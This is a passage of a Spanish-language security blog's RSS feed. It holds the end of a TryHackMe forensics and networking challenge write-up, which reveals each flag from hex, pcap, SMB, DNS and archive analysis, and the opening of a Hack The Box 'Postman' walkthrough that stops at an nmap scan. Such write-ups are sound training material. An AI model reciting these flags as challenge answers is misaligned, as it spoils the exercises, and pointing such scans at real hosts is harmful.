   0x000000000000120c &amp;lt;+99&amp;gt;:	mov    BYTE PTR &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;rbp-0x65&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;,0x7d
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;... snip ...&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;strong&gt;HEX&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;m&#34;&gt;46&lt;/span&gt;  4c  &lt;span class=&#34;m&#34;&gt;41&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;47&lt;/span&gt;  7b  &lt;span class=&#34;m&#34;&gt;69&lt;/span&gt;  6e  &lt;span class=&#34;m&#34;&gt;63&lt;/span&gt;  6f  &lt;span class=&#34;m&#34;&gt;72&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;72&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;65&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;63&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;74&lt;/span&gt;  7d
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;strong&gt;FLAG&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;FLAG&lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;incorrect&lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Con la frase correcta:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;sckull@uplifted:~/tmp/forensics$ ./f.08
Hello, please enter the flag:
FLAG&lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;incorrect&lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
Well &lt;span class=&#34;k&#34;&gt;done&lt;/span&gt;, you got the flag correct!!!

sckull@uplifted:~/tmp/forensics$
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;f09&#34;&gt;f.09&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;9
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;0f4d0db3668dd58cabb9eb409657eaa8
&lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
d015cc465bdb4e51987df7fb870472d3fb9a3505
_
_
b109f3bbbc244eb82441917ed06d618b9008dd09b3befd1b5e07394c706a8bb980b1d7785e5976ec049b46df5f1326af5a2ea6d103fd07c95385ffab0cacbc86
_
d04b98f48e8f8bcc15c6ae5ac050801cd6dcfd428fb5f9e65c4e16e7807340fa
&lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/stealthcopter/Screenshot%20from%202020-03-10%2020.46.16.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;f10&#34;&gt;f.10&lt;/h2&gt;
&lt;p&gt;&lt;a href=&#34;https://www.dcode.fr/brainfuck-language&#34;&gt;&lt;strong&gt;Brainfuck Language&lt;/strong&gt;&lt;/a&gt;&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/stealthcopter/Screenshot%20from%202020-03-10%2020.48.20.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h1 id=&#34;networking&#34;&gt;Networking&lt;/h1&gt;
&lt;h2 id=&#34;n01pcap&#34;&gt;n.01.pcap&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;Filtro:&lt;/strong&gt; HTTP GET&lt;br /&gt;
FLAG{n0w_y0ur_g3tt1ng_1t}&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/stealthcopter/Screenshot%20from%202020-03-10%2020.51.29.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;n02pcap&#34;&gt;n.02.pcap&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;Filtro:&lt;/strong&gt; HTTP POST&lt;br /&gt;
FLAG{1_am_th3_p0stm4n}&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/stealthcopter/Screenshot%20from%202020-03-10%2020.54.13.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;n03pcap&#34;&gt;n.03.pcap&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;USER AGENT&lt;/strong&gt;&lt;br /&gt;
FLAG{s3cr3t_ag3nt}&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/stealthcopter/Screenshot%20from%202020-03-10%2020.55.01.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;n04pcap&#34;&gt;n.04.pcap&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;OBJECTS HTTP&lt;/strong&gt;&lt;br /&gt;
FLAG{h3r3_1_am}&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/stealthcopter/Screenshot%20from%202020-03-10%2020.56.15.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/stealthcopter/Screenshot%20from%202020-03-10%2020.57.24.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;n05pcap&#34;&gt;n.05.pcap&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;SMB&lt;/strong&gt;&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/stealthcopter/Screenshot%20from%202020-03-10%2020.59.26.webp&#34; alt=&#34;image&#34; /&gt;&lt;br /&gt;
&lt;strong&gt;SMB OBJECT&lt;/strong&gt;&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/stealthcopter/Screenshot%20from%202020-03-10%2021.00.03.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;sckull@uplifted:~/tmp/networking$ tar -xvf smb_object05.tar 
flag.txt
sckull@uplifted:~/tmp/networking$ cat flag.txt 
FLAG&lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;smb_smb_smb_smb_smb_smb&lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
sckull@uplifted:~/tmp/networking$
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;n06pcap&#34;&gt;n.06.pcap&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;FTP&lt;/strong&gt;&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/stealthcopter/Screenshot%20from%202020-03-10%2021.03.30.webp&#34; alt=&#34;image&#34; /&gt;&lt;br /&gt;
FLAG{1n3s3cur3_&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;TELNET&lt;/strong&gt;&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/stealthcopter/Screenshot%20from%202020-03-10%2021.04.48.webp&#34; alt=&#34;image&#34; /&gt;&lt;br /&gt;
pr0t0c0ls}&lt;/p&gt;
&lt;p&gt;FLAG{1n3s3cur3_pr0t0c0ls}&lt;/p&gt;
&lt;h2 id=&#34;n07pcap&#34;&gt;n.07.pcap&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;DNS&lt;/strong&gt;&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/stealthcopter/Screenshot%20from%202020-03-10%2021.09.33.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;m&#34;&gt;46&lt;/span&gt; 4c &lt;span class=&#34;m&#34;&gt;41&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;47&lt;/span&gt; 7b &lt;span class=&#34;m&#34;&gt;64&lt;/span&gt; 6e &lt;span class=&#34;m&#34;&gt;73&lt;/span&gt; 5f &lt;span class=&#34;m&#34;&gt;33&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;78&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;66&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;31&lt;/span&gt; 6c &lt;span class=&#34;m&#34;&gt;74&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;72&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;34&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;74&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;30&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;72&lt;/span&gt; 7d
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;pre&gt;&lt;code&gt;https://gchq.github.io/CyberChef/#recipe=From_Hex(&#39;Auto&#39;)&amp;amp;input=NDYgNGMgNDEgNDcgN2IgNjQgNmUgNzMgNWYgMzMgNzggNjYgMzEgNmMgNzQgNzIgMzQgNzQgMzAgNzIgN2Q
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;FLAG{dns_3xf1ltr4t0r}&lt;/p&gt;
&lt;h2 id=&#34;n08pcap&#34;&gt;n.08.pcap&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;tcp and data&lt;/strong&gt;&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/stealthcopter/Screenshot%20from%202020-03-10%2021.13.35.webp&#34; alt=&#34;image&#34; /&gt;&lt;br /&gt;
FLAG{this is a hidden flag}&lt;/p&gt;
&lt;h2 id=&#34;n09&#34;&gt;n.09&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;7z File&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;33
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;34
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;35
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;36
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;37
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;38
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;39
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;40
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;41
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;42
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;sckull@uplifted:~/tmp/networking$ file n.09 
n.09: 7-zip archive data, version 0.3
sckull@uplifted:~/tmp/networking$ xxd n.09 &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; head
00000000: 377a bcaf 271c &lt;span class=&#34;m&#34;&gt;0003&lt;/span&gt; 46c0 dcbf d40b &lt;span class=&#34;m&#34;&gt;0000&lt;/span&gt;  7z..&lt;span class=&#34;s1&#34;&gt;&amp;#39;...F.......
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;00000010: 0000 0000 2300 0000 0000 0000 cf09 fa64  ....#..........d
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;00000020: 0068 33be 1c86 3077 60f4 a484 2585 fa1c  .h3...0w`...%...
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;00000030: 7627 82f2 9186 dc88 ca27 bae3 fb13 c5ff  v&amp;#39;&lt;/span&gt;.......&lt;span class=&#34;err&#34;&gt;&amp;#39;&lt;/span&gt;......
00000040: 0e24 c288 d1b1 &lt;span class=&#34;m&#34;&gt;0114&lt;/span&gt; 695f 90fd b8ca a6d3  .$......i_......
00000050: 2f38 db8c 915e 7e32 f588 4d5c 3f35 4a84  /8...^~2..M&lt;span class=&#34;se&#34;&gt;\?&lt;/span&gt;5J.
00000060: 242d b5f0 8c96 a4e0 ce62 &lt;span class=&#34;m&#34;&gt;7105&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;5389&lt;/span&gt; 18f1  &lt;span class=&#34;nv&#34;&gt;$-&lt;/span&gt;.......bq.S...
00000070: e946 8af0 1d2f a762 e91a 934b 32a6 7eb8  .F.../.b...K2.~.
00000080: &lt;span class=&#34;m&#34;&gt;8322&lt;/span&gt; 16d1 2abc 32be &lt;span class=&#34;m&#34;&gt;2107&lt;/span&gt; 1dae 03ac 6edf  .&lt;span class=&#34;s2&#34;&gt;&amp;#34;..*.2.!.....n.
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;00000090: e042 8551 7d12 e93f 57e4 fa2b 4f3d a993  .B.Q}..?W..+O=..
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;sckull@uplifted:~/tmp/networking&lt;/span&gt;$&lt;span class=&#34;s2&#34;&gt; mv n.09 n.09.7z
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;sckull@uplifted:~/tmp/networking&lt;/span&gt;$&lt;span class=&#34;s2&#34;&gt; 7z e n.09.7z 
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;p7zip Version 16.02 (locale=en_US.UTF-8,Utf16=on,HugeFiles=on,64 bits,8 CPUs Intel(R) Core(TM) i5-8250U CPU @ 1.60GHz (806EA),ASM,AES-NI)
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;Scanning the drive for archives:
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;1 file, 3095 bytes (4 KiB)
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;Extracting archive: n.09.7z
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;--
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;Path = n.09.7z
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;Type = 7z
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;Physical Size = 3095
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;Headers Size = 198
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;Method = LZMA:23
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;Solid = +
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;Blocks = 1
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;Everything is Ok
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;Files: 2
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;Size:       26112
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;Compressed: 3095
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;sckull@uplifted:~/tmp/networking&lt;/span&gt;$&lt;span class=&#34;s2&#34;&gt; 
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;sckull@uplifted:~/tmp/networking&lt;/span&gt;$&lt;span class=&#34;s2&#34;&gt; strings *.msg| grep FL
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;      FLAG\{sn41L_m41L\}
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;      FLAG{sn41L_m41L}&amp;lt;br&amp;gt;
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;sckull@uplifted:~/tmp/networking&lt;/span&gt;$&lt;span class=&#34;s2&#34;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;n10pcap&#34;&gt;n.10.pcap&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;SSL Certificate&lt;/strong&gt;&lt;br /&gt;
SSL Wireshark: &lt;strong&gt;Edit &amp;gt; Preferences &amp;gt; Protocols &amp;gt; SSL &amp;gt; (Pre)-Master-Secret log filename &amp;gt; Select n.10.ssl.log&lt;/strong&gt;&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/stealthcopter/Screenshot%20from%202020-03-10%2021.28.23.webp&#34; alt=&#34;image&#34; /&gt;&lt;br /&gt;
FLAG{y0u_ar3_c3rt1f13d_n0w}&lt;/p&gt;
</content:encoded>
        <dc:creator>sckull</dc:creator>
        <media:content url="https://sckull.github.io/images/posts/thm/stealthcopter/cover.webp" medium="image"><media:title type="html">featured image</media:title></media:content>
        
        <media:content url="https://sckull.github.io/images/posts/thm/stealthcopter/cover.webp" medium="image"><media:title type="html">meta image</media:title></media:content>
        
          
            
              <category>challenge</category>
            
          
        
        
          
            
              <category>tryhackme</category>
            
          
        
        
      </item>
      
      <item>
        <title>Hack The Box - Postman</title>
        <link>https://sckull.github.io/posts/postman/</link>
        <pubDate>Sat, 14 Mar 2020 00:00:00 +0000</pubDate>
        
        <atom:modified>Sat, 14 Mar 2020 00:00:00 +0000</atom:modified>
        <guid>https://sckull.github.io/posts/postman/</guid>
        <description>Postman es una maquina de HackTheBox aqui encontrarás la solucion para obtener la flag user.txt y root.txt.</description>
        <content:encoded>&lt;p&gt;Postman es una maquina de HackTheBox aqui encontrarás la solucion para obtener la flag user.txt y root.txt.&lt;/p&gt;




  



  &lt;div class=&#34;featured-image__wrapper&#34;&gt;
    &lt;img src=&#34;https://sckull.github.io/images/posts/htb/postman/cover.webp&#34; alt=&#34;featured image&#34; class=&#34;featured-image&#34; style=&#34;width: ;height: ;&#34;&gt;
  &lt;/div&gt;

&lt;h3 id=&#34;informacion-de-la-maquina&#34;&gt;Informacion de la Maquina&lt;/h3&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Nombre&lt;/th&gt;
&lt;th&gt;Postman&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;OS&lt;/td&gt;
&lt;td&gt;Linux&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Puntos&lt;/td&gt;
&lt;td&gt;20&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Dificultad&lt;/td&gt;
&lt;td&gt;Facil&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;IP&lt;/td&gt;
&lt;td&gt;10.10.10.160&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Maker&lt;/td&gt;
&lt;td&gt;&lt;a href=&#34;https://www.hackthebox.eu/home/users/profile/114053&#34;&gt;TheCyberGeek&lt;/a&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h2 id=&#34;nmap&#34;&gt;NMAP&lt;/h2&gt;
&lt;p&gt;Escaneo de puerto tcp/udp, en el cual nos muestra el puerto http (80) y el puerto de ssh (22) abierto.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;33
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;34
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# Nmap 7.80 scan initiated Thu Dec 26 14:42:29 2019 as: nmap -p- --min-rate 1000 -o postman_nmap 10.10.10.160&lt;/span&gt;
Warning: 10.10.10.160 giving up on port because retransmission cap hit &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;10&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
